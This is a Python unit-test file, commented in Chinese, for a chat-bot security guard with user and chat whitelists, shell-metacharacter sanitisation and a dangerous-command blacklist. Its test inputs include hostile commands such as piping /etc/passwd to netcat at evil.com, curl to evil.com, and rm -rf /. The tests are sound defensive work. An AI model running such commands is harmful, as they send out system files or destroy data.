"""SecurityGuard 单元测试。"""
from __future__ import annotations

import pytest

from src.security import (
    DANGEROUS_COMMAND_PREFIXES,
    SHELL_INJECTION_PATTERN,
    SecurityError,
    SecurityGuard,
)


@pytest.fixture
def guard():
    """标准测试 fixture：2 个用户 + 1 个群。"""
    return SecurityGuard(
        allowed_users=["ou_alice", "ou_bob"],
        allowed_chats=["oc_test_group"],
    )


# ===== 用户白名单测试 =====


def test_allowed_user(guard: SecurityGuard):
    """白名单内用户返回 True。"""
    assert guard.is_user_allowed("ou_alice") is True
    assert guard.is_user_allowed("ou_bob") is True


def test_denied_user(guard: SecurityGuard):
    """非白名单用户返回 False。"""
    assert guard.is_user_allowed("ou_eve") is False
    assert guard.is_user_allowed("ou_unknown") is False


def test_empty_user_id(guard: SecurityGuard):
    """空 user_id 被拒绝。"""
    assert guard.is_user_allowed("") is False


def test_user_whitelist_isolation(guard: SecurityGuard):
    """白名单内部 set 不可被外部 list 修改影响。"""
    # SecurityGuard 接收 list，但内部应复制为 set
    users = ["ou_temp1", "ou_temp2"]
    g = SecurityGuard(allowed_users=users)
    # 修改原 list
    users.append("ou_hacker")
    # 不应影响 guard
    assert g.is_user_allowed("ou_hacker") is False


# ===== 群白名单测试 =====


def test_chat_allowed(guard: SecurityGuard):
    """白名单内群返回 True。"""
    assert guard.is_chat_allowed("oc_test_group") is True


def test_chat_denied(guard: SecurityGuard):
    """非白名单群返回 False。"""
    assert guard.is_chat_allowed("oc_other_group") is False


def test_empty_chat_whitelist_denies_all():
    """群白名单为空时拒绝所有群（保守策略）。"""
    g = SecurityGuard(allowed_users=["ou_x"])
    assert g.is_chat_allowed("oc_any") is False


def test_empty_chat_id(guard: SecurityGuard):
    """空 chat_id 被拒绝。"""
    assert guard.is_chat_allowed("") is False


# ===== 输入清理测试 =====


def test_injection_prevention_semicolon(guard: SecurityGuard):
    """分号被清理（命令分隔符）。"""
    assert guard.sanitize_input("ls;rm -rf /") == "lsrm -rf /"


def test_injection_prevention_dollar(guard: SecurityGuard):
    """美元符号被清理（变量替换）。"""
    assert guard.sanitize_input("echo $HOME") == "echo HOME"


def test_injection_prevention_backtick(guard: SecurityGuard):
    """反引号被清理（命令替换）。"""
    assert guard.sanitize_input("echo `whoami`") == "echo whoami"


def test_injection_prevention_pipe(guard: SecurityGuard):
    """管道符被清理。"""
    assert guard.sanitize_input("cat /etc/passwd | nc evil.com") == "cat /etc/passwd  nc evil.com"


def test_injection_prevention_newline(guard: SecurityGuard):
    """换行符被清理。"""
    assert guard.sanitize_input("hello\nworld") == "helloworld"


def test_injection_prevention_redirect(guard: SecurityGuard):
    """重定向符被清理。"""
    assert guard.sanitize_input("ls > /tmp/x") == "ls  /tmp/x"


def test_injection_prevention_combined(guard: SecurityGuard):
    """组合攻击字符全部清理。"""
    evil = ";$`|&><\n\r"
    cleaned = guard.sanitize_input(evil)
    assert cleaned == ""


def test_sanitize_preserves_safe_chars(guard: SecurityGuard):
    """安全字符（字母数字空格常见标点）保留。"""
    safe = "hello world 123 - /list ses_001 --verbose"
    assert guard.sanitize_input(safe) == safe


def test_sanitize_none_input(guard: SecurityGuard):
    """None 输入返回空字符串。"""
    assert guard.sanitize_input(None) == ""


# ===== 命令验证测试（黑名单） =====


def test_validate_safe_command(guard: SecurityGuard):
    """安全命令通过验证。"""
    assert guard.validate_command("/list") == "/list"
    assert guard.validate_command("/send ses_001 hello world") == "/send ses_001 hello world"


def test_validate_dangerous_rm_rf(guard: SecurityGuard):
    """rm -rf 命令被拒绝。"""
    with pytest.raises(SecurityError, match="危险前缀"):
        guard.validate_command("rm -rf /")


def test_validate_dangerous_sudo(guard: SecurityGuard):
    """sudo 命令被拒绝。"""
    with pytest.raises(SecurityError, match="危险前缀"):
        guard.validate_command("sudo rm /etc/passwd")


def test_validate_dangerous_curl(guard: SecurityGuard):
    """curl 命令被拒绝（防止数据外传）。"""
    with pytest.raises(SecurityError, match="危险前缀"):
        guard.validate_command("curl http://evil.com")


def test_validate_dangerous_after_sanitize(guard: SecurityGuard):
    """清理后再检查黑名单（双层防护）。

    输入 'rm$ -rf /'（$ 在中间）会被清理成 'rm -rf /'，然后被黑名单拒绝。
    """
    with pytest.raises(SecurityError):
        # 'rm$ -rf /' → 清理为 'rm -rf /' → 黑名单拒绝
        guard.validate_command("rm$ -rf /")


# ===== 动态白名单管理测试 =====


def test_add_user(guard: SecurityGuard):
    """动态添加白名单用户。"""
    assert guard.is_user_allowed("ou_new") is False
    guard.add_user("ou_new")
    assert guard.is_user_allowed("ou_new") is True


def test_remove_user(guard: SecurityGuard):
    """动态移除白名单用户。"""
    assert guard.is_user_allowed("ou_alice") is True
    guard.remove_user("ou_alice")
    assert guard.is_user_allowed("ou_alice") is False


def test_remove_nonexistent_user_silent(guard: SecurityGuard):
    """移除不存在的用户不报错（discard 语义）。"""
    # 不抛 KeyError
    guard.remove_user("ou_never_existed")


# ===== 配置加载场景（集成测试） =====


def test_from_config_dict():
    """从 config.yaml 的 security 段加载（与 config.py 集成）。"""
    config = {
        "security": {
            "allowed_users": ["ou_cfg_alice", "ou_cfg_bob"],
            "allowed_chats": ["oc_cfg_group"],
        }
    }
    guard = SecurityGuard(
        allowed_users=config["security"]["allowed_users"],
        allowed_chats=config["security"]["allowed_chats"],
    )
    assert guard.is_user_allowed("ou_cfg_alice") is True
    assert guard.is_chat_allowed("oc_cfg_group") is True


# ===== 模式常量测试 =====


def test_shell_injection_pattern_completeness():
    """SHELL_INJECTION_PATTERN 覆盖所有声明的危险字符。"""
    expected_chars = ";$`|&><\n\r"
    for char in expected_chars:
        assert SHELL_INJECTION_PATTERN.search(char), f"字符 {char!r} 未被模式匹配"


def test_dangerous_command_prefixes_nonempty():
    """黑名单非空（防止误配置）。"""
    assert len(DANGEROUS_COMMAND_PREFIXES) > 0
    assert "rm -rf" in DANGEROUS_COMMAND_PREFIXES